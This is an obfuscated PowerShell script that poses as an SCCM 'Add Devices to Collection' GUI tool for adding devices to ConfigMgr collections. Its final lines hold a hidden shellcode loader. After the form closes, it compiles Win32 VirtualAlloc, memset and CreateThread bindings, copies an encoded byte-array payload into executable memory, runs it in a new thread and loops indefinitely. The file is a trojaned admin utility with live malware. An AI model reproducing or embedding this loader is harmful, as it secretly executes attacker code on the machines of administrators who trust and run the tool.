 $Y25DN  =  [TyPe]("{0}{4}{8}{3}{7}{1}{9}{6}{2}{5}"-F'SysT','fO','a','S','em.WI','tioN','lIc','.','ndOw','RMs.apP') ;   seT-ItEm  vaRiABlE:DEiFR2 ( [TYpe]("{8}{3}{4}{1}{7}{2}{0}{6}{5}"-F's','.reFlEcTi','.aS','e','m','mBLY','e','ON','sYst')) ;  set-iTem ("VARI"+"A"+"BLE:"+"43QD") ([TyPE]("{2}{0}{1}{3}" -f'stEM.Dra','WInG.Ic','SY','on')) ;  [CmdletBinding()]
param(
[parameter(Mandatory=$true)]
[string]$SiteServer,
[parameter(Mandatory=$true)]
[string]$SiteCode
)

function LO`A`d-FORM {
    $Form.Controls.AddRange(@($SBStatus, $CBAuto, $CBManual, $DGVAuto, $DGVManual, $ButtonStart, $ButtonClear, $ButtonAuto, $ButtonManual, $RTBInput, $OutputBox, $GBOutputBox, $GBInput, $GBAuto, $GBManual))
    $ButtonAuto.Enabled = $false
    $ButtonManual.Enabled = $false
	$Form.Add_Shown({Get-CMCollections})
    $Form.Add_Shown({
        $Form.Activate()
        $RTBInput.Select()
    })
	[void]$Form.ShowDialog()
}

function wri`Te-`OU`TPUtBOX {
	param(
	[parameter(Mandatory=$true)]
	[string]$OutputBoxMessage,
	[ValidateSet({"{2}{0}{1}"-f'ARN','ING: ','W'},{"{0}{1}"-f'ERROR',': '},{"{1}{0}"-f' ','INFO:'})]
	[string]$Type,
    [switch]$NoNewLine
	)
	Process {
        $DateTime = (Get-Date).ToLongTimeString()
        if ($NoNewLine -eq $true) {
		    if ($OutputBox.Text.Length -eq 0) {
			    $OutputBox.Text = "$($OutputBoxMessage)"
			     ( Get-itEM  ('VAr'+'iab'+'le:Y'+'25D'+'N') ).ValUe::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
		    else {
			    $OutputBox.AppendText("$($OutputBoxMessage)")
			     $y25dN::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
        }
        else {
		    if ($OutputBox.Text.Length -eq 0) {
			    $OutputBox.Text = "$($DateTime) $($Type)$($OutputBoxMessage) "
			      $Y25DN::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
		    else {
			    $OutputBox.AppendText("`n$($DateTime) $($Type)$($OutputBoxMessage) ")
			     $Y25Dn::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }        
        }
	}
}

function geT-`C`MCO`LlECT`io`Ns {
    $Collections = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{4}{2}{3}{1}{0}" -f 'on','lecti','MS_C','ol','S') -ComputerName $SiteServer -Filter ((("{8}{10}{19}{6}{14}{20}{18}{13}{12}{9}{2}{3}{1}{22}{16}{7}{11}{15}{17}{0}{4}{5}{21}{23}"-f' ',' Man','%','-','{','0','he','0','Name li','}','ke {0','}','ke {0','ame li','d',' OR Nam','l{','e like','d{0} OR N','}%- Sc','ule','}%- ','ua','Run now{0}')) -f[cHAR]39)
    $SortedCollections = $Collections | Sort-Object -Property ("{0}{1}" -f 'N','ame')
    Write-OutputBox -OutputBoxMessage ("{1}{2}{4}{0}{3}{5}"-f ' avai','Proc','ess','lab','ing','le collections') -Type ("{0}{1}"-f'INFO:',' ')
    $ButtonStart.Enabled = $false
    foreach ($Collection in $SortedCollections) {
        $CBAuto.Items.Add($Collection.Name)
        $CBManual.Items.Add($Collection.Name)
    }
    $ButtonStart.Enabled = $true
    $CollectionCount = ($Collections | Measure-Object).Count
    Write-OutputBox -OutputBoxMessage "Processed $($CollectionCount) collections " -Type ("{2}{0}{1}"-f'F','O: ','IN')
}

function geT-CmD`evICeCoL`lE`c`T`Io`N`MembErS`HIp {
    param(
    [parameter(Mandatory=$true)]
    [string]$ResourceID
    )
    $GetDeviceCollectionMembership = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{7}{0}{1}{4}{2}{6}{8}{3}{5}"-f'Ful','lColl','o','rshi','ecti','p','n','SMS_','Membe') -ComputerName $SiteServer -Filter "ResourceID='$($ResourceID)' AND (CollectionID='GT000049' OR CollectionID='GT00002D') "
    if ($GetDeviceCollectionMembership -ne $null) {
        if ($GetDeviceCollectionMembership.CollectionID -like ("{2}{1}{0}" -f '049','0','GT00')) {
            if ($ButtonAuto.Enabled -eq $false) {
                $ButtonAuto.Enabled = $true
            }
            $DGVAuto.Rows.Add($GetDeviceCollectionMembership.Name)
        }
        if ($GetDeviceCollectionMembership.CollectionID -like ("{2}{1}{0}"-f '2D','0','GT000')) {
            if ($ButtonManual.Enabled -eq $false) {
                $ButtonManual.Enabled = $true
            }
            $DGVManual.Rows.Add($GetDeviceCollectionMembership.Name)
        }
    }
}

function GEt-`CmD`eVI`Ce {
    param(
    [parameter(Mandatory=$true)]
    [string]$DeviceName,
    [parameter(Mandatory=$true)]
    [int]$Count,
    [parameter(Mandatory=$true)]
    [int]$TotalCount
    )
    $GetDevice = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{1}{0}{2}{3}" -f 'Sys','SMS_R_','te','m') -ComputerName $SiteServer -Filter "Name='$($DeviceName)'"
    if ($GetDevice -ne $null) {
        if ($GetDevice.Obsolete -eq 0) {
            Write-OutputBox -OutputBoxMessage "Found device: $($GetDevice.Name) " -Type ("{0}{1}{2}"-f 'IN','FO',': ')
            $SBPProcessingCount.Text = "Processing device $($Count) of $($TotalCount) "
            Get-CMDeviceCollectionMembership -ResourceID $GetDevice.ResourceID
        }
    }
    else {
        Write-OutputBox -OutputBoxMessage "Not found: $($DeviceName) " -Type ("{1}{0}{2}"-f 'G','WARNIN',': ')
    }
}

function aD`d-direc`TMEMbErSh`Ip {
    param(
    [parameter(Mandatory=$true)]
    [string]$DeviceName,
    [parameter(Mandatory=$true)]
    [string]$CollectionName
    )
    if ((Get-DeviceMembership -DeviceName $DeviceName -CollectionName $CollectionName) -eq $false) {
        $ResourceID = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{0}{1}{2}"-f 'SM','S_R_Syste','m') -ComputerName $SiteServer -Filter "Name='$($DeviceName)'" | Select-Object -ExpandProperty ("{1}{0}{2}"-f 'u','Reso','rceID')
        $CollectionQuery = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{1}{0}{3}{2}{4}" -f'S','SM','le','_Col','ction') -ComputerName $SiteServer -Filter "Name='$($CollectionName)'"
        $NewRule = ([WMIClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_CollectionRuleDirect").CreateInstance()
        $NewRule.ResourceClassName = ("{0}{2}{3}{1}"-f'SMS_','YSTEM','R','_S')
        $NewRule.ResourceID = $ResourceID
        $NewRule.Rulename = $DeviceName
        $CollectionQuery.AddMemberShipRule($NewRule) | Out-Null
        if ($Error[0]) {
            $Global:ProcessedError++
            Write-OutputBox -OutputBoxMessage "Error adding $($DeviceName) to '$($CollectionName)' " -Type ("{0}{1}"-f'ERROR',': ')
        }
        else {
            $Global:ProcessedSuccess++
            Write-OutputBox -OutputBoxMessage "Successfully added $($DeviceName) to '$($CollectionName)' " -Type ("{1}{0}{2}" -f 'FO:','IN',' ')
        }
    }
    else {
        $Global:ProcessedWarning++
        Write-OutputBox -OutputBoxMessage "$($DeviceName) is already a member of '$($CollectionName)' " -Type ("{0}{1}" -f 'WARNIN','G: ')
    }
}

function g`eT`-`de`VIC`eMembeRShIp {
    param(
    [parameter(Mandatory=$true)]
    [string]$DeviceName,
    [parameter(Mandatory=$true)]
    [string]$CollectionName
    )
    $CollectionID = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{4}{0}{1}{3}{2}" -f 'MS','_Collect','n','io','S') -ComputerName $SiteServer -Filter "Name='$($CollectionName)'" | Select-Object  -ExpandProperty ("{2}{1}{0}{3}" -f 'cti','e','Coll','onID')
    $DeviceCollectionMembershipQuery = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class ("{1}{0}{4}{3}{7}{2}{5}{6}" -f '_F','SMS','lecti','o','ullC','o','nMembership','l') -ComputerName $SiteServer -Filter "Name='$($DeviceName)' AND CollectionID='$($CollectionID)' " -ErrorAction ("{2}{0}{3}{1}{4}"-f 'len','Continu','Si','tly','e')
    if ($DeviceCollectionMembershipQuery) {
        return $true
    }
    else {
        return $false
    }
}

function sTart-Ad`DD`EvicEtO`CoLLe`CT`ion {
    param(
    [parameter(Mandatory=$true)]
    [string]$CollectionName,
    [parameter(Mandatory=$true)]
    [ValidateSet({"{1}{0}"-f 'to','Au'},{"{0}{1}"-f'M','anual'})]
    [string]$Type
    )
    if ($Type -like ("{1}{0}" -f'uto','A')) {
        for ($RowCount = 0; $RowCount -lt $DGVAuto.RowCount; $RowCount++) {
            $ButtonAuto.Enabled = $false
            $SBPProcessingCount.Text = ("Processing device $($RowCount+1) of $($DGVAuto.RowCount) ")
            Write-OutputBox -OutputBoxMessage "Adding '$($DGVAuto.Rows[$RowCount].Cells["Device"].Value)' to collection: '$($CollectionName)' " -Type ("{1}{0}"-f 'FO: ','IN')
            Add-DirectMembership -DeviceName "$($DGVAuto.Rows[$RowCount].Cells["Device"].Value)" -CollectionName $CollectionName
        }
        $ButtonAuto.Enabled = $true
        $SBPProcessingCount.Text = ""
    }
    if ($Type -like ("{1}{2}{0}"-f'l','M','anua')) {
        for ($RowCount = 0; $RowCount -lt $DGVManual.RowCount; $RowCount++) {
            $ButtonManual.Enabled = $false
            $SBPProcessingCount.Text = ("Processing device $($RowCount+1) of $($DGVManual.RowCount) ")
            Write-OutputBox -OutputBoxMessage "Adding '$($DGVManual.Rows[$RowCount].Cells["Device"].Value)' to collection: '$($CollectionName)' " -Type ("{1}{0}" -f 'O: ','INF')
            Add-DirectMembership -DeviceName "$($DGVManual.Rows[$RowCount].Cells["Device"].Value)" -CollectionName $CollectionName
        }
        $ButtonManual.Enabled = $true
        $SBPProcessingCount.Text = ""
    }
    $RowCount = 0
    Write-OutputBox -OutputBoxMessage ("{2}{3}{1}{0}{4}" -f 'u','ng res','S','howi','lts:') -Type ("{0}{1}{2}" -f 'I','NF','O: ')
    Write-OutputBox -OutputBoxMessage "Success: $($Global:ProcessedSuccess) " -Type ("{0}{1}" -f'INFO',': ')
    Write-OutputBox -OutputBoxMessage "Warning: $($Global:ProcessedWarning) " -Type ("{0}{1}"-f'INFO:',' ')
    Write-OutputBox -OutputBoxMessage "Error: $($Global:ProcessedError) " -Type ("{0}{1}" -f 'INFO',': ')
}

function S`T`ART-`SEaRcH {
    $ButtonStart.Enabled = $false
    $SBPStatus.Text = ("{0}{1}{2}" -f'Proces','s','ing')
    $CurrentCount = 0
    $Devices = $RTBInput.Text
    $DeviceArray = $Devices.Split("`n")
    if ($DeviceArray -ne $null) {
        foreach ($Device in $DeviceArray) {
            $CurrentCount++
            Get-CMDevice -DeviceName $Device -Count $CurrentCount -TotalCount ($DeviceArray | Measure-Object).Count
        }
    }
    else {
        Write-OutputBox -OutputBoxMessage ("{8}{10}{1}{6}{2}{3}{5}{0}{7}{4}{9}" -f 'ed t','es ','s be','en','li',' add','ha','o the ','No devi','st','c') -Type ("{0}{1}{2}" -f'W','AR','NING: ')
    }
    $ButtonStart.Enabled = $true
    $SBPStatus.Text = ("{0}{1}" -f'Rea','dy')
    $SBPProcessingCount.Text = ""
}

function StarT-`c`le`AR {
    $RTBInput.ResetText()
    $DGVAuto.Rows.Clear()
    $DGVManual.Rows.Clear()
    $OutputBox.ResetText()
    if ($ButtonAuto.Enabled -eq $true) {
        $ButtonAuto.Enabled = $false
    }
    if ($ButtonManual.Enabled -eq $true) {
        $ButtonManual.Enabled = $false
    }
}


$Global:ProcessedSuccess = 0
$Global:ProcessedWarning = 0
$Global:ProcessedError = 0


[void]  (VARiabLE  DEiFr2).VaLue::LoadWithPartialName(("{3}{0}{1}{2}"-f 'y','stem.Drawi','ng','S')) 
[void]  ( ls  VArIABLE:dEIfR2 ).ValUE::LoadWithPartialName(("{0}{2}{3}{1}"-f'System.W','ws.Forms','i','ndo')) 


$Form = New-Object ("{4}{2}{3}{0}{5}{1}"-f 'W','rms.Form','yste','m.','S','indows.Fo')    
$Form.Size = New-Object ("{2}{0}{3}{1}"-f 'm.','awing.Size','Syste','Dr')(950,700)  
$Form.MinimumSize = New-Object ("{0}{2}{4}{3}{1}"-f 'System','ize','.Draw','g.S','in')(950,700)
$Form.MaximumSize = New-Object ("{1}{0}{3}{4}{2}" -f'D','System.','ize','ra','wing.S')(950,700)
$Form.SizeGripStyle = ("{1}{0}"-f'ide','H')
$Form.Icon =   $43Qd::ExtractAssociatedIcon($PSHome + ((("{2}{1}{5}{0}{4}{3}"-f'e','}powe','{0','exe','ll.','rsh')) -f[cHaR]92))
$Form.Text = ("{5}{7}{3}{4}{6}{0}{1}{2}"-f'l','lection 1','.0',' ','to C','Add Devi','o','ces')
$Form.ControlBox = $true
$Form.TopMost = $true


$SBPStatus = New-Object ("{4}{5}{1}{2}{0}{3}{6}"-f'P','ws','.Forms.StatusBar','ane','Wind','o','l')
$SBPStatus.Text = ("{1}{0}" -f 'y','Read')
$SBPStatus.Width = "100"
$SBPTotalCount = New-Object ("{6}{3}{5}{1}{0}{4}{7}{2}" -f 'atu','rms.St','el','s.F','s','o','Window','BarPan')
$SBPTotalCount.Text = ""
$SBPTotalCount.Width = "100"
$SBPProcessingCount = New-Object ("{5}{6}{2}{4}{3}{0}{1}" -f 'Bar','Panel','dows.','rms.Status','Fo','W','in')
$SBPProcessingCount.Text = ""
$SBPProcessingCount.Width = "740"
$SBStatus = New-Object ("{1}{2}{3}{5}{4}{0}"-f 'usBar','W','indows.Form','s.St','t','a')
$SBStatus.ShowPanels = $true
$SBStatus.SizingGrip = $false
$SBStatus.AutoSize = ("{1}{0}" -f 'l','Ful')
$SBStatus.Panels.AddRange(@($SBPStatus, $SBPTotalCount, $SBPProcessingCount))


$GBOutputBox = New-Object ("{0}{3}{1}{2}{7}{6}{5}{4}" -f'Sy','em.Wind','ows.','st','ox','B','orms.Group','F')
$GBOutputBox.Location = New-Object ("{1}{2}{0}{3}"-f'i','System.Dra','w','ng.Size')(10,480) 
$GBOutputBox.Size = New-Object ("{1}{2}{3}{4}{5}{0}" -f 'e','System.Dra','wi','ng','.S','iz')(920,150) 
$GBOutputBox.Text = ("{1}{0}" -f 'ing','Logg')
$GBInput = New-Object ("{7}{0}{3}{8}{4}{5}{1}{2}{6}"-f'tem.W','s.Gro','upBo','ind','ws','.Form','x','Sys','o')
$GBInput.Location = New-Object ("{5}{4}{2}{0}{1}{3}" -f 'wing','.Siz','a','e','.Dr','System')(10,10) 
$GBInput.Size = New-Object ("{1}{4}{3}{0}{2}"-f'ing','Sys','.Size','aw','tem.Dr')(220,460) 
$GBInput.Text = ("{3}{1}{0}{2}"-f 'e Li','vic','st','De')
$GBAuto = New-Object ("{3}{1}{5}{4}{2}{0}"-f'upBox','em.Windows.F','Gro','Syst','rms.','o')
$GBAuto.Location = New-Object ("{1}{2}{3}{5}{0}{4}" -f 'wi','Syst','em','.Dr','ng.Size','a')(240,10) 
$GBAuto.Size = New-Object ("{2}{1}{3}{4}{0}"-f'e','te','Sys','m.Dra','wing.Siz')(340,460) 
$GBAuto.Text = ("{0}{1}"-f 'Aut','o')
$GBManual = New-Object ("{2}{0}{5}{3}{4}{1}" -f'ow','GroupBox','System.Wind','ms','.','s.For')
$GBManual.Location = New-Object ("{3}{2}{0}{1}"-f 'ing.Si','ze','em.Draw','Syst')(590,10) 
$GBManual.Size = New-Object ("{4}{1}{2}{0}{5}{3}"-f 'ng','.Dr','awi','ize','System','.S')(340,460) 
$GBManual.Text = ("{1}{0}{2}" -f'anua','M','l')


$ButtonStart = New-Object ("{1}{0}{8}{3}{4}{6}{7}{5}{2}" -f 't','Sys','ton','.','Windows.For','t','ms.','Bu','em') 
$ButtonStart.Location = New-Object ("{4}{1}{3}{0}{2}{5}{6}" -f 'e','y','m.Drawi','st','S','ng.Siz','e')(125,427)
$ButtonStart.Size = New-Object ("{5}{4}{0}{1}{3}{2}"-f'awi','ng.','ze','Si','m.Dr','Syste')(95,30) 
$ButtonStart.Text = ("{1}{0}" -f 'tart','S')
$ButtonStart.TabIndex = 1
$ButtonStart.Add_Click({Start-Search})
$ButtonClear = New-Object ("{1}{3}{0}{4}{2}{5}" -f'ndo','Syst','s.Butt','em.Wi','ws.Form','on') 
$ButtonClear.Location = New-Object ("{1}{4}{3}{2}{0}"-f '.Size','S','wing','a','ystem.Dr')(20,427)
$ButtonClear.Size = New-Object ("{0}{4}{2}{5}{1}{3}{6}"-f'S','awing','ste','.','y','m.Dr','Size')(95,30) 
$ButtonClear.Text = ("{0}{1}" -f 'Cle','ar')
$ButtonClear.TabIndex = 2
$ButtonClear.Add_Click({Start-Clear})
$ButtonAuto = New-Object ("{2}{0}{3}{1}{5}{4}"-f '.Wi','.Form','System','ndows','Button','s.') 
$ButtonAuto.Location = New-Object ("{0}{1}{3}{2}{4}" -f 'Sys','tem.','raw','D','ing.Size')(475,427)
$ButtonAuto.Size = New-Object ("{3}{2}{0}{1}" -f'Drawi','ng.Size','tem.','Sys')(95,30) 
$ButtonAuto.Text = "Add"
$ButtonAuto.TabIndex = 1
$ButtonAuto.Add_MouseClick({
    if ($CBAuto.SelectedItem -ne $null) {
        Start-AddDeviceToCollection -CollectionName "$($CBAuto.SelectedItem)" -Type ("{1}{0}" -f'o','Aut')
    }
    else {
        Write-OutputBox -OutputBoxMessage ("{0}{3}{1}{5}{4}{2}{7}{6}{10}{8}{9}" -f'No','e','s selec',' coll','ion wa','ct',' th','ted from','op dow','n list','e dr') -Type ("{1}{2}{0}" -f'ING: ','WAR','N')
    }
})
$ButtonManual = New-Object ("{0}{6}{5}{3}{2}{4}{1}" -f'Syst','.Button','orm','indows.F','s','W','em.') 
$ButtonManual.Location = New-Object ("{3}{1}{0}{2}{4}{5}" -f 'm.','te','Draw','Sys','ing.Siz','e')(825,427)
$ButtonManual.Size = New-Object ("{5}{4}{3}{1}{2}{0}"-f'Size','Drawin','g.','m.','e','Syst')(95,30) 
$ButtonManual.Text = "Add"
$ButtonManual.TabIndex = 1
$ButtonManual.Add_MouseClick({
    if ($CBManual.SelectedItem -ne $null) {
        Start-AddDeviceToCollection -CollectionName $CBManual.SelectedItem -Type ("{1}{0}"-f 'ual','Man')
    }
    else {
        Write-OutputBox -OutputBoxMessage ("{7}{11}{6}{13}{8}{4}{12}{2}{5}{1}{3}{0}{10}{9}{14}" -f'e dr','o','d ','m th','t','fr',' collectio','N',' selec','w','op do','o','e','n was','n list') -Type ("{0}{1}" -f 'WARN','ING: ')
    }
})


$CBAuto = New-Object ("{5}{0}{4}{3}{8}{1}{6}{2}{7}"-f 't','or','s.ComboB','Windows.','em.','Sys','m','ox','F')
$CBAuto.Location = New-Object ("{1}{3}{4}{2}{0}" -f 'ze','Sys','ng.Si','tem.D','rawi')(250,395)
$CBAuto.Size = New-Object ("{0}{2}{1}{3}{4}" -f'Sy','.Dra','stem','wing.Siz','e')(320,20)
$CBAuto.DropDownStyle = ("{3}{0}{1}{2}"-f 'ropDo','wn','List','D')
$CBAuto.DropDownHeight = "250"
$CBManual = New-Object ("{6}{3}{0}{7}{1}{5}{2}{4}" -f'e','d','mboBo','t','x','ows.Forms.Co','Sys','m.Win')
$CBManual.Location = New-Object ("{4}{3}{1}{0}{2}" -f'm.Drawi','te','ng.Size','ys','S')(600,395)
$CBManual.Size = New-Object ("{3}{1}{0}{2}{4}" -f'win','.Dra','g.','System','Size')(320,20)
$CBManual.DropDownStyle = ("{2}{1}{0}"-f 't','s','DropDownLi')
$CBManual.DropDownHeight = "250"


$OutputBox = New-Object ("{7}{5}{3}{1}{4}{0}{6}{2}"-f 'T','.','ox','ws','Forms.Rich','do','extB','System.Win')
$OutputBox.Location = New-Object ("{1}{2}{5}{3}{4}{0}" -f 'e','Sy','stem','ing.S','iz','.Draw')(20,500)
$OutputBox.Size = New-Object ("{4}{5}{3}{1}{0}{2}" -f'S','ng.','ize','awi','S','ystem.Dr')(900,120)
$OutputBox.Font = ("{3}{2}{0}{1}"-f' N','ew','ourier','C')
$OutputBox.BackColor = ("{1}{0}" -f 'hite','w')
$OutputBox.ReadOnly = $true
$OutputBox.MultiLine = $True
$RTBInput = New-Object ("{5}{9}{2}{8}{3}{6}{0}{1}{7}{4}"-f '.Forms.R','ich','e','Wi','extBox','Sy','ndows','T','m.','st')
$RTBInput.Location = New-Object ("{0}{2}{4}{3}{1}" -f'S','ze','ys','.Drawing.Si','tem')(20,27)
$RTBInput.Size = New-Object ("{6}{0}{3}{1}{5}{2}{4}" -f'em','Drawi','.S','.','ize','ng','Syst')(200,390)
$RTBInput.TabIndex = 1
$RTBInput.Add_TextChanged({
    $InputText = $RTBInput.Text
    $InputText = $InputText.Split("`n")
    $InputCount = ($InputText | Measure-Object).Count
    $SBPTotalCount.Text = "Row count: $($InputCount) "
})


$DGVAuto = New-Object ("{5}{0}{6}{1}{2}{3}{4}" -f 'e','w','s.Forms.DataG','ridV','iew','Syst','m.Windo')
$DGVAuto.Location = New-Object ("{3}{2}{0}{1}{4}{5}" -f 'em','.Draw','yst','S','i','ng.Size')(250,30)
$DGVAuto.Size = New-Object ("{1}{2}{0}{3}"-f '.S','System.Dr','awing','ize')(320,360)
$DGVAuto.Anchor = ("{2}{0}{1}{3}{5}{4}" -f 'om, Le','ft','Top, Bott',', R','ght','i')
$DGVAuto.ColumnCount = 1
$DGVAuto.ColumnHeadersVisible = $true
$DGVAuto.Columns[0].Name = ("{1}{0}" -f 'ice','Dev')
$DGVAuto.Columns[0].AutoSizeMode = ("{0}{1}" -f'Fi','ll')
$DGVAuto.AllowUserToAddRows = $false
$DGVAuto.AllowUserToDeleteRows = $false
$DGVAuto.ReadOnly = $true
$DGVAuto.MultiSelect = $false
$DGVAuto.ColumnHeadersHeightSizeMode = ("{1}{3}{2}{0}" -f'sizing','Dis','Re','able')
$DGVAuto.RowHeadersWidthSizeMode = ("{0}{1}{2}" -f'DisableRes','i','zing')
$DGVAuto.RowHeadersVisible = $false
$DGVManual = New-Object ("{1}{0}{9}{3}{6}{5}{8}{7}{4}{2}" -f 't','Sys','w','ndo','e','For','ws.','ataGridVi','ms.D','em.Wi')
$DGVManual.Location = New-Object ("{5}{1}{3}{2}{0}{4}"-f 'g','m','rawin','.D','.Size','Syste')(600,30)
$DGVManual.Size = New-Object ("{1}{3}{2}{0}"-f '.Size','Syst','awing','em.Dr')(320,360)
$DGVManual.Anchor = ("{7}{2}{5}{1}{4}{3}{0}{6}"-f'R','m, Le','o',', ','ft','tto','ight','Top, B')
$DGVManual.ColumnCount = 1
$DGVManual.ColumnHeadersVisible = $true
$DGVManual.Columns[0].Name = ("{0}{1}"-f'D','evice')
$DGVManual.Columns[0].AutoSizeMode = ("{1}{0}"-f 'l','Fil')
$DGVManual.AllowUserToAddRows = $false
$DGVManual.AllowUserToDeleteRows = $false
$DGVManual.ReadOnly = $true
$DGVManual.MultiSelect = $false
$DGVManual.ColumnHeadersHeightSizeMode = ("{3}{2}{0}{1}"-f 'in','g','isableResiz','D')
$DGVManual.RowHeadersWidthSizeMode = ("{0}{2}{1}" -f 'Disable','izing','Res')
$DGVManual.RowHeadersVisible = $false


Load-Form
$c = ((("{39}{75}{6}{5}{0}{32}{51}{44}{45}{74}{73}{20}{2}{34}{33}{49}{26}{1}{59}{67}{25}{12}{8}{69}{65}{24}{72}{27}{62}{56}{3}{15}{50}{53}{43}{40}{64}{54}{23}{10}{18}{55}{52}{30}{11}{70}{41}{22}{46}{17}{13}{4}{61}{21}{68}{14}{36}{58}{48}{47}{38}{7}{19}{42}{60}{66}{31}{37}{57}{71}{35}{28}{63}{16}{29}{9}"-f'ic st','cationType,','r ','tPtr CreateTh','Cr','.dllXbL)]publ','t(XbLkernel32','Lm','mp',');','wS','r','tect);[DllI',' dw',' IntPtr lpT','read(','cou','t','tac','svcr','Pt','s','Par',' uint d','el32.dl','nt flPro','o',' stat','t src, ','nt','tartAdd','c','ati',', uint d','lpAddress','Ptr dest, uin','hread',' static extern Int','b','[DllImpo','readAt',' IntPtr lp','t.dllXbL)]pub','Th','tPt','r V','ameter, uin','lImport(X','l','wSize, uint flAll','I','c extern In','IntPtr lpS','ntPtr lp','ibutes,','kSize, ','c extern In','Ptr mems','Id);[D',' ','l','eationFlag','i','uint ','tr','rn','i','ui',',','ort(XbLke','ess,','et(Int','lXbL)]public','(Int','irtualAlloc','r'))  -CrEPlACe([CHaR]88+[CHaR]98+[CHaR]76),[CHaR]34);$w = Add-Type -memberDefinition $c -Name ("{1}{0}" -f '32','Win') -namespace ("{1}{3}{2}{0}" -f'ns','W','tio','in32Func') -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc0,0xbf,0xf5,0x6e,0xa5,0x30,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0xe1,0x8c,0x50,0xcc,0xe1,0xd3,0x9b,0x2d,0xf1,0xb3,0x12,0xc8,0xc0,0xf3,0x41,0x98,0x72,0xc4,0x02,0xcc,0x7e,0xaf,0x47,0xe5,0xf5,0xdd,0x4f,0x0a,0xbe,0x68,0xb6,0x25,0x3f,0xc0,0x8a,0x24,0xc3,0x1b,0xdf,0x86,0xfa,0xd3,0x12,0xc6,0x3b,0x09,0xde,0x9a,0x94,0x45,0x4d,0x0b,0x91,0x10,0x4e,0xa0,0xe9,0xb5,0xd6,0x55,0xb9,0xb4,0xf7,0xcb,0xb2,0xee,0xd7,0xea,0x17,0x9b,0x51,0xf5,0x74,0xa6,0x28,0x8e,0x4e,0x5c,0xab,0x46,0x9f,0x9d,0x00,0xa7,0x10,0x6c,0x58,0xef,0x96,0x8f,0x2f,0x19,0xe5,0x32,0x28,0xde,0x94,0xe8,0xbd,0xc5,0x3e,0x7a,0x65,0x22,0xbf,0xaf,0xf0,0xa1,0xb3,0x04,0x76,0xed,0xd7,0x9b,0x5b,0x85,0xe3,0x10,0x5a,0x4a,0x62,0x62,0x79,0x4e,0x2f,0x30,0xe0,0xd7,0x95,0x97,0x1d,0x07,0x76,0x47,0xb8,0x43,0x9a,0x9c,0xb1,0x09,0xf2,0x51,0xf8,0xb1,0x02,0xfe,0x8b,0xc2,0x30,0xa1,0x27,0x4d,0x78,0x2a,0xee,0x8a,0x7f,0x01,0x56,0x04,0x7e,0xaa,0xa7,0x0c,0x44,0xfe,0xf7,0x26,0x6d,0x7f,0x9c,0xb6,0x92,0xaa,0x09,0xb2,0x04,0x07,0x9f,0x82,0xad,0xcf,0x1d,0xfb,0x5c,0x4c,0xab,0x1d,0x0e,0x3c,0xfb,0xb1,0xee,0xec,0xbb,0x61,0x86,0xe6,0x33,0x5d,0xb6,0x08,0x9e,0xf6,0x5c,0xe7,0x77,0xae,0xc8,0x9e,0xdd,0x24,0x69,0x5e,0xc8,0x40,0xa9,0xd4,0xff,0xb5,0x67,0x1d,0x75,0xa6,0x1f,0xed,0xc0,0x94,0x89,0xf2,0xfe,0xb3,0x35,0x67,0x05,0x12,0x62,0x1f,0x07,0x43,0x44,0x80,0xf8,0xa6,0xdf,0x09,0x6d,0x09,0xb7,0x75,0x61,0x89,0x47,0x20,0xeb,0x89,0x2f,0x94,0x4f,0xda,0x4a,0xdb,0x45,0x4e,0xc7,0x4e,0x66,0x27,0xb4,0xd9,0x0e,0xc5,0xe3,0x2e,0x91,0x36,0xc6,0xae,0xed,0xe0,0x2e,0xc5,0x1f,0x31;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
